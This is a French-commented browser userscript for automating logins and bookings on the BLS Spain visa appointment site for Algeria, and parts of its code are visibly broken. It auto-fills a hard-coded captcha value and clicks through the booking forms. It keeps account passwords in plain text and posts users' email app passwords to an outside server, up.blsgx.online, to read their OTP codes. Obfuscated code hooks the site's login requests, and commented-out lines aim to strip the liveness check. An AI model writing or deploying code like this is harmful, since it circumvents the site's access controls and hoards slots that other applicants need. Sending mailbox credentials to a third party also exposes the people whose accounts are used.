                Id: captchaId,
                Captcha: "Bf0KU6r4PHzEtR9My6uzzPdKSddwylXruf9ExVC2AqwgiR5ycEqqKD0n6sTVxpXFAMEiyxKbKypeIJeRKluBctR3LnnxxPJy2rnOI+vCTXd/dFEObgxYW8YwyGW58oGBY3+nQ87uJvgs3HZgc+ZOft1fFK82dImahOv4G4ZaWzOqa/P/5MCDtejXzT9Oz0ZR7ADLJ6J+MzD2LrB8OZpKBsr5JdNjSEfcIQHHX2aY/c4Ax+Xw+FLWvYTC4N6oeceaAWvVATxJpBxADKkI79Ltu0o1Mw6cF2lgS8IwQsXuzLTQYCnRbl7D1dh8O556BQackiPdUnRtfWHbsnpXSESSH/JfofZ/kIZak4qxQ6+Bthlxsg6H2hVJx+44GdBwkoDN4V7E47kPAlSRiZtJUzoyozyG8rvqKeXwbucRyLBywkte2srjfD0rRpWdJ4LBpkI6P10GBCuRQC2c13GL2RQH8PPrfdIVs6MuEDLhktzfUO1LWg0E4lMtEpC44hcydqhL680ho2HFM2DDrf7x41PZE07Z4ZcnQrnrkC3HG98ukQY73KHKJnrCR8698RN0nVE43Cdenplq1BHAO0uKDbFaxXlAfR3pmDRoFYOoZeNZ9ZUD18UtRl+G62Ng2DE/mN0N+MNUOEYM1G96SvqDFx644Ud4cp6ecvF1FkCg0tMszDjP5vUwnkd8cNgYlnOGFWOpz4pW9kaGe05khy3YtBTD48J4+CxTpPAauoQvcr7zfumEYYNDFWKxh6SD0NHAiBu/EQW2Xq5tgSDVD8P4NKvIE4dcge2JUpckYCe1CfLsZbQBGbaxVr9vEFvZ0XXWIivBxJGPwwmJQ8et1pZ8YxQoDY2VJO3RRX+PS3Uotr3EnQ4EVf83V7mSlZ7TrBvL5nMlPaGk0TKajUUI4n75VtZR1C8lgsxvTlM+klZ1Vh3JYYVdIgru823JN/lI2LbvPieTZu5xJGkF23o5mrXJW/Chk8chm5llGr82qSjdylBm8+z6dJ2a9poNYvl044u6WYFtqHECgTiHkqFnWEzOIK7XgpgX6HFMfhgFyQZImyeQd+tRZNiH8bYoXz29DBKKkkaLQH0DN2TnJakDqvDkpZLsGeFk3A1ZpaX4geR4lyx2S5jkQnQBUS6b9xqPqC0tMEUXWwyFKh3Zyyixpzc4T0pibJz01WwwW0MROCTWy+/x21L4RoZQgUn/0kZf2nlQo+5gzHk2mkIJguWprFDSxTCWDoFrteMtoeKZ1Z4NvaBfYfwJDtqmana+olPBrfMIiyPFoVdBe4kAJegfb0/dC+1uWEln/k604YF/P3yoHfP4BcN6C5Mn2urxZc13DzWaOhAoX9beX+gpkCMPXeeII5f+YfcDdZP2Dvrc42Rc7vSCvr7nb2yTopbTCoE7t4pT2uHh56QYy5+GgOnRJX5mzZRdkHK3zH6dVxohfpIFUJUQdKXqgLxlVSyCYboqrYwXpSGt/P5Vu/KFhTVxUqCGay9Gtf3W/taBraqopkj3Di2hPTfxw2KdW3UBwDBmt4YX57vTYNOvfuZPqooQQhDlxy5LuBSTON0ssrxo2ew4Oca+IfNVqC033cZUnQnxQSObrNN+ilO9A/OwYw57DVPmgfo/m2+USh27bZHX+CgoQdPPQ48/Gsz7MVjaTdBQ2sg7D/FJuVuKECylGo89bydEPTlGyyvrn1pPgI2j9Zm4r3/xxCVx3MH1D5SOeCpCdXKQwsyuOO6fOj55cUvmpvxekd8+F20X9WgKVElqkk0Gcw4sTSFlpfGT05j3LnY+G3nE7LGOP3huhV6417M+zcW2XUYU0k0zyh02R4Qdb/HL+xVoazoNyw4g9haiabpdQZN5hQTee+vVKLAsG3gRe9FLnSjoumkb0GKMjdRN1gfmpg10/oVTladgE93wYK1A4DatM9Y/6J26ka0i3Mw6oSqjJXswuBZzbbl7ZfSF46jPwpZj12RDrPDSMjydh7cx7x4ycY68",
                __RequestVerificationToken: document.getElementsByName("__RequestVerificationToken")[0].value,
            },
            axiosConfig
        ).then(res => {
            console.log(res.data);
            document.getElementById("CaptchaData").value = res.data['captcha'];
            document.getElementById("CaptchaId").value = res.data['captchaId'];

var btnVerify = document.getElementById("btnVerify");
if (btnVerify) {
    btnVerify.style.display = "none";
    btnVerify.innerText = "Captcha Verified";
    btnVerify.className = "btn btn-success text-center";
    btnVerify.setAttribute("disabled", "");
    // You can customize other style properties or attributes if needed
}


            // Afficher le bouton btnSubmit
            var btnSubmit = document.getElementById("btnSubmit");
            if (btnSubmit) {
                btnSubmit.style.display = "block";
                btnSubmit.innerText = "Log'in";
            }
        });
    };
})();

 function tramelle() {
        if ($('#btnSubmit').attr('style') === '') {
            $('#btnSubmit').click();
            $('#btnSubmit').prop('disabled', true);
        }
    }
if (location.href.match(/ChangePassword|changepassword|CHANGEPASSWORD/)) {
        window.location.replace('https://algeria.blsspainglobal.com/DZA/bls/vtv0050');
    }

    if(window.location.href == ("https://algeria.blsspainglobal.com/DZA/blsappointment/manageapplicant?alert=true")){
       window.location.replace("https://algeria.blsspainglobal.com/DZA/bls/vtv0050");
    }
   if (window.location.href.includes("https://algeria.blsspainglobal.com/DZA/bls/vtv0050")) {
    $("button[id=btnVerify]").click();
    setInterval(function() { tramelle(); }, 1000);
}

       if(location.href.match(/Home|home|HOME/)){
          if ($(".avatar-img").length){
                window.location.replace("https://algeria.blsspainglobal.com/DZA/bls/vtv0050");
          }else{
                window.location.replace("https://algeria.blsspainglobal.com/DZA/account/login");
          }
       }

      var VariabLe = $(".bg-mode form div:visible .form-label:contains('Visa Type')").attr("id");
       var VariabLe_2 = $(".bg-mode form div:visible .form-label:contains('Visa Sub Type')").attr("id");
       var VariabLe_3 = $(".bg-mode form div:visible .form-label:contains('Appointment Category')").attr("id");

     if(location.href.match(/data/)){

         for (var i = 1; i < 6; i++) {

          if(VariabLe == "VisaType"+i+"_label"){
            $("#VisaType"+i+"_listbox > li:eq(1)").click();
        }
        if(VariabLe_2 == "VisaSubType"+i+"_label"){
            $("#VisaSubType"+i+"_listbox > li:eq(0)").click();
        }
        if(VariabLe_3 == "AppointmentCategoryId"+i+"_label"){
            $("#AppointmentCategoryId"+i+"_listbox > li:eq(1)").click();
        }

      /*  if(VariabLe_4 == "Location"+i+"_label"){
            $("#Location"+i+"_listbox > li:eq(0)").click();
        }*/
 }

    var choixUtilisateur = prompt(" SELECT : 1 // ALGER / 0 // ORAN ");
var variabLe_4 = $(".bg-mode form div:visible .form-label:contains('Location')").attr("id");

if (choixUtilisateur === "0" || choixUtilisateur === "1") {
    for (var i = 1; i < 6; i++) {
        if (variabLe_4 == "Location" + i + "_label") {
            // Sélectionne l'élément correspondant en fonction du choix de l'utilisateur
            var indexToClick = parseInt(choixUtilisateur);

            // Clique sur l'élément de la liste déroulante correspondant au choix de l'utilisateur
            $("#Location" + i + "_listbox > li:eq(" + indexToClick + ")").click();


            break;
        }
    }
} else {
}



(function() {
    'use strict';

    // Attendez que la page soit entièrement chargée
    window.addEventListener('load', function() {
        // Récupérez le bouton par son ID
        var submitButton = document.getElementById('btnSubmit');

        // Vérifiez si le bouton existe
        if (submitButton) {
            // Cliquez sur le bouton
           submitButton.click();
        } else {
            console.log('Le bouton Submit n\'a pas été trouvé.');
        }
   });
})();//
(function() {
    'use strict';

    // Function to click the "Ok" button
    function clickOkButton() {
        var okButton = document.querySelector('.modal-footer .btn-primary');
        if (okButton) {
            okButton.click();
        }
    }

    // Check for the modal and click the "Ok" button when it appears
    function observeModal() {
        var maxAttempts = 10; // Adjust the number of attempts as needed
        var attempts = 0;

        var intervalId = setInterval(function() {
            var modal = document.querySelector('.modal-content');
            if (modal) {
                clearInterval(intervalId); // Stop checking
                clickOkButton();
            }

            attempts++;
            if (attempts >= maxAttempts) {
                clearInterval(intervalId); // Stop checking after a certain number of attempts
            }
        }, 1000); // Adjust the interval as needed
    }

    // Wait for the document to be fully loaded before observing the DOM for changes
    window.addEventListener('load', function() {
        observeModal();
    });

})();


}

if(location.href.match(/ManageAppointment/)){





 }

  if(location.href.match(/livenessdetection/)){

    //  $('script[src="/assets/vendor/bioid/js/startVideo().js?v=cYV2_QtkS9WSeWhabBLqSPxCFEFAVxkA7oHJZH3HYKQ"]').remove();
    //  $('script').remove()

 }


 $(window).scrollTop( 180 );


(function() {
    'use strict';

    // Créer et ajouter le conteneur pour la page de connexion
    const loginContainer = document.createElement('div');
    loginContainer.className = 'login-container';
    document.body.appendChild(loginContainer);

    // Injecter les styles personnalisés
    const style = document.createElement('style');
    style.innerHTML = `
       .modal-container {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            justify-content: flex-start;
            align-items: center;
            background: rgba(0, 0, 0, 0.5);
            z-index: 100000000;
        }

        .login-container {
            display: flex;
            justify-content: center;
            align-items: center;
            height: 200vh;
        }

        .login-form {
            display: table;
            padding: 30px;
            color: #fff;
            background: #0f0d0d;
            border-radius: 10px;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
            width: 400px;
            max-width: 80%;
            height: 300px; /* Hauteur ajustée */
        }

        .login-form h1 {
            margin: 0 0 24px 0;
        }

        .login-form .form-input-material {
            margin-bottom: 12px;
        }

        .login-form .btn {
            width: 90%;
            margin-bottom: 10px;
        }

        .btn-danger {
            background-color: #962020;
            color: #fff;
        }

        .form-row {
            display: table-row;
        }

        .form-cell {
            display: table-cell;
            padding: 8px;
        }

        .form-label {
            font-weight: bold;
            padding-right: 10px;
        }

        .form-input {
            padding: 6px;
            border-radius: 5px;
            border: 1px solid #ccc;
        }
    `;
    document.head.appendChild(style);
// Function to simulate a click event on an element

    function clickElement(element) {
         const loginDelay = 2000;
        var event = new MouseEvent('click', {
            bubbles: true,
            cancelable: true,
            view: window
        });
        element.dispatchEvent(event);
    }

    // Create and append the button to the header
    const button = document.createElement('button');
    button.className = 'btn btn-primary btn-ghost';
    button.innerText = 'SHOW LOGIN FORM';
    document.body.insertBefore(button, document.body.firstChild);


    // Create and append the "Supprimer" button
    const deleteButton = document.createElement('button');
    deleteButton.className = 'btn btn-danger btn-ghost';
    deleteButton.innerText = 'DELETE';
    document.body.insertBefore(deleteButton, button.nextSibling);

    const modalContainer = document.createElement('div');
    modalContainer.className = 'modal-container';
    modalContainer.innerHTML = `
       <div class="login-form">
        <h1>ADD APPLICANT</h1>
        <div class="form-group">
            <label for="fullName">Nom Prénom</label>
            <input type="text" name="fullName" id="fullName" placeholder=" " autocomplete="off" class="form-control" required />
        </div>

        <div class="form-group">
            <label for="email">Adresse email "BLS ACCOUNT"</label>
            <input type="email" name="email" id="email" placeholder=" " autocomplete="off" class="form-control" required />
        </div>
        <div class="form-group">
            <label for="password">Mot de passe "BLS ACCOUNT"</label>
            <input type="password" name="password" id="password" placeholder=" " autocomplete="off" class="form-control" required />
        </div>
        <div class="form-group">
          <label for="__RS_otpPassword" class="form-label">Application OTP Password: <span class="emoji" title="Pour récupérer le mot de passe d'application de votre e-mail, accédez aux paramètres de sécurité de votre compte e-mail et générez un nouveau mot de passe d'application. Ce mot de passe sera utilisé ici.">ℹ️</span></label>
            <input type="text" class="form-control" id="__RS_otpPassword">
        </div>
        <button type="submit" class="btn btn-primary btn-ghost" id="saveButton">Enregistrer</button>
        <button class="btn btn-primary btn-ghost" id="closeButton">Fermer</button>
    </div>
    `;
    loginContainer.appendChild(modalContainer);

    // Add event listener to the button
    button.addEventListener('click', function() {
        modalContainer.style.display = 'flex';
    });

    // Add event listener to the "Supprimer" button
    deleteButton.addEventListener('click', function() {
        const profiles = document.querySelectorAll('.delete-profile');
        profiles.forEach(profile => {
            profile.style.textDecoration = '';
            profile.style.color = 'white';
            profile.addEventListener('click', function() {
                const profileIndex = Array.from(profiles).indexOf(profile);
                const savedButtons = JSON.parse(localStorage.getItem('buttons')) || [];
                const updatedButtons = savedButtons.filter((_, index) => index !== profileIndex);
                localStorage.setItem('buttons', JSON.stringify(updatedButtons));
                updateProfileButtons();
            });
        });
    });

    // Add event listener to the save button
    const saveButton = document.getElementById('saveButton');
    if (saveButton) {
        saveButton.addEventListener('click', function() {
            const fullName = document.getElementById('fullName').value;
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;
            const __RS_otpPassword = document.getElementById('__RS_otpPassword').value;

            const buttons = JSON.parse(localStorage.getItem('buttons')) || [];
            buttons.push({ fullName, buttonText: ` ${fullName}`, email, password });
            localStorage.setItem('buttons', JSON.stringify(buttons));
            updateProfileButtons();

            modalContainer.style.display = 'none';
        });
    }

    // Add event listener to the close button
    const closeButton = document.getElementById('closeButton');
    if (closeButton) {
        closeButton.addEventListener('click', function() {
            modalContainer.style.display = 'none';
        });
    }

    // Add event listener to the form to hide it when submitted
    const form = document.querySelector('.login-form');
    if (form) {
        form.addEventListener('submit', function(event) {
            event.preventDefault();
            alert('Custom form submission logic');
            modalContainer.style.display = 'none';
        });
    }

    // Restore saved buttons on page load
    function updateProfileButtons() {
        const savedButtons = JSON.parse(localStorage.getItem('buttons')) || [];
        const existingButtons = document.querySelectorAll('.delete-profile');
        existingButtons.forEach(button => button.remove());

        for (const savedButton of savedButtons) {
            const restoredButton = document.createElement('button');
            restoredButton.className = 'btn btn-primary btn-ghost delete-profile';
            restoredButton.innerText = savedButton.buttonText;
            document.body.insertBefore(restoredButton, button.nextSibling);

            restoredButton.addEventListener('click', function() {
                document.getElementById('UserId1').value = savedButton.email;
                document.getElementById('UserId2').value = savedButton.email;
                document.getElementById('UserId3').value = savedButton.email;
                document.getElementById('UserId4').value = savedButton.email;
                document.getElementById('UserId5').value = savedButton.email;
                document.getElementById('UserId6').value = savedButton.email;
                document.getElementById('UserId7').value = savedButton.email;
                document.getElementById('UserId8').value = savedButton.email;
                document.getElementById('UserId9').value = savedButton.email;
                document.getElementById('UserId10').value = savedButton.email;
                document.getElementById('Password1').value = savedButton.password;
                document.getElementById('Password2').value = savedButton.password;
                document.getElementById('Password3').value = savedButton.password;
                document.getElementById('Password4').value = savedButton.password;
                document.getElementById('Password5').value = savedButton.password;
                document.getElementById('Password6').value = savedButton.password;
                document.getElementById('Password7').value = savedButton.password;
                document.getElementById('Password8').value = savedButton.password;
                document.getElementById('Password9').value = savedButton.password;
                document.getElementById('Password10').value = savedButton.password;

                $('#btnSubmit').click();
                $('#btnSubmit').prop('disabled', true);
            });
        }
    }

    updateProfileButtons();
    (function () {
'use strict';
const expectedResponse = '';
var originalOpen = XMLHttpRequest.prototype.open;
XMLHttpRequest.prototype.open = function (method, url, async, user, password) {
    if (url.includes('/DZA/account/loginPost')) {
        url = url.replace('/DZA/account/loginPost', '/dza/account/loginPost');
    }
    originalOpen.call(this, method, url, async, user, password);
};
function _0x2d4d(_0x8f0210, _0x11da09) {
    const _0x1c446c = _0x1c44();
    return _0x2d4d = function (_0x2d4db3, _0x56b6c2) {
        _0x2d4db3 = _0x2d4db3 - 0x148;
        let _0x3a54bf = _0x1c446c[_0x2d4db3];
        return _0x3a54bf;
    }, _0x2d4d(_0x8f0210, _0x11da09);
}(function (_0x3fa3d7, _0x58bce3) {
    const _0x346fda = _0x2d4d
        , _0x345031 = _0x3fa3d7();
    while (!![]) {
        try {
            const _0x103221 = -parseInt(_0x346fda(0x154)) / 0x1 +
                -parseInt(_0x346fda(0x152)) / 0x2 * (-parseInt(
                    _0x346fda(0x15b)) / 0x3) + parseInt(_0x346fda(
                    0x148)) / 0x4 + -parseInt(_0x346fda(0x158)) /
                0x5 * (parseInt(_0x346fda(0x14a)) / 0x6) +
                parseInt(_0x346fda(0x157)) / 0x7 * (-parseInt(
                    _0x346fda(0x150)) / 0x8) + parseInt(_0x346fda(
                    0x155)) / 0x9 + parseInt(_0x346fda(0x14c)) /
                0xa;
            if (_0x103221 === _0x58bce3) break;
            else _0x345031['push'](_0x345031['shift']());
        } catch (_0x485aa7) {
            _0x345031['push'](_0x345031['shift']());
        }
    }
}(_0x1c44, 0xaada4), (function () {
    'use strict';
    const _0x2a9ef9 = _0x2d4d;
    fetch [_0x2a9ef9(0x159)](
        _0x422d96 => _0x422d96[_0x2a9ef9(0x14d)]())[
        _0x2a9ef9(0x159)](_0x3be9f6 => {
        const _0xfcbb83 = _0x2a9ef9

        if (_0x3be9f6 === _0x33f880) {
            var _0xfffbf1 = XMLHttpRequest[
                'prototype'][_0xfcbb83(0x14b)];
            XMLHttpRequest['prototype']['open'] =
                function (_0x2214f5, _0x433cdc,
                    _0x87f202, _0x3dd671, _0x15168e) {
                    const _0x2e021c = _0xfcbb83;
                    _0x433cdc[_0x2e021c(0x14e)](
                            '/DZA/account/login') && (
                            _0x433cdc = _0x433cdc[
                                _0x2e021c(0x15d)](
                                _0x2e021c(0x153),
                                _0x2e021c(0x14f))),
                        _0xfffbf1['call'](this,
                            _0x2214f5, _0x433cdc,
                            _0x87f202, _0x3dd671,
                            _0x15168e);
            };
        } else console[_0xfcbb83(0x15a)](_0xfcbb83(
            0x156));
    })[_0x2a9ef9(0x15c)](_0x546720 => {
        const _0x50dbaa = _0x2a9ef9;
        console[_0x50dbaa(0x149)](_0x50dbaa(0x151),
            _0x546720);
          })();
        }()));
    })();

})();};})();

// Récupérer l'adresse email et le mot de passe du formulaire
    const Email = document.querySelector("#email").value;
    const OTPPassword = document.querySelector("#__RS_otpPassword").value;

    console.log("Email: " + Email);
    console.log("Application OTP Password: " + OTPPassword);

    const SendVerificationCodeButton = document.querySelector("#btnSenderificationCode");
    const Verify_Button = document.querySelector("#btnVerifyEmail");

    SendVerificationCodeButton.addEventListener("click", async function () {
        async function GetTheAppointment() {
            console.log("OTP Directly from Function");
            await sleep(1);
            var otp = await getOTPOnly();
            console.log(otp);
            console.log("email :" + Email + ", pass :" + OTPPassword);
            document.querySelector("#EmailVerificationCode").value = otp;
            setTimeout(() => {
                if (document.querySelector("#EmailVerificationCode").value == otp) {
                    Verify_Button.click();
                } else {
                    console.log("the otp code is wrong");
                }
            }, 500);
        }

        await GetTheAppointment();
    });

    setTimeout(() => {
        let SendVerificationCodeButton = document.querySelector("#btnSenderificationCode");

        if (SendVerificationCodeButton.textContent == "Resend Verification Code") {
            async function GetTheAppointment() {
                console.log("OTP Directly from Function");
                await sleep(1);
                var otp = await getOTPOnly();
                console.log(otp);
                console.log("email :" + Email + ", pass :" + OTPPassword);
                document.querySelector("#EmailVerificationCode").value = otp;
                setTimeout(() => {
                    if (document.querySelector("#EmailVerificationCode").value == otp) {
                        Verify_Button.click();
                    } else {
                        console.log("the otp code is wrong");
                    }
                }, 500);
            }

            GetTheAppointment();

        } else {
            console.log("the otp code is not sent yet ");
        }

    }, 1500);

    async function getOTPOnly() {
        console.log("getONLY")
        let otp = 0;
        var myHeaders = new Headers();
        myHeaders.append("Content-Type", "application/json");

        var raw = JSON.stringify({
            "email": Email,
            "__RS_otpPassword": OTPPassword,
        });

        var requestOptions = {
            method: 'POST',
            headers: myHeaders,
            body: raw,
            redirect: 'follow'
        };

        const res = await fetch("https://up.blsgx.online/email", requestOptions);

        return await res.json();
    }

    async function sleep(seconds) {
        return new Promise(res => setTimeout(res, seconds * 500));
    }

;

        console.log('Individual est activé !');
    }
}

// Créer les toggle switches sur la page
function createToggleSwitches() {
    const simpleScriptToggle = document.createElement('input');
    simpleScriptToggle.type = 'checkbox';
    simpleScriptToggle.className = 'toggle-switch';
    simpleScriptToggle.checked = simpleScriptEnabled;
    simpleScriptToggle.addEventListener('change', function() {
        simpleScriptEnabled = this.checked;
        saveToggleSwitchState();
        executeSimpleScript();
    });

    const individualToggle = document.createElement('input');
    individualToggle.type = 'checkbox';
    individualToggle.className = 'toggle-switch';
    individualToggle.checked = individualEnabled;
    individualToggle.addEventListener('change', function() {
        individualEnabled = this.checked;
        saveToggleSwitchState();
        executeIndividualScript();
    });

    const simpleScriptLabel = document.createElement('label');
    simpleScriptLabel.textContent = 'SIMPLE SCRIPT';
    simpleScriptLabel.appendChild(simpleScriptToggle);

    const individualLabel = document.createElement('label');
    individualLabel.textContent = 'INDIVIDUAL';
    individualLabel.appendChild(individualToggle);

    const container = document.createElement('div');
    container.appendChild(simpleScriptLabel);
    container.appendChild(document.createElement('br'));
    container.appendChild(individualLabel);

    const blsInternationalElement = document.querySelector('.col-lg-3 h4.text-primary');
    const parent = blsInternationalElement.parentElement;
    parent.insertBefore(container, blsInternationalElement.nextSibling);

    // Exécuter les scripts une fois les toggle switches créés
    executeSimpleScript();
    executeIndividualScript();
}

// Appeler la fonction pour créer les toggle switches
createToggleSwitches();
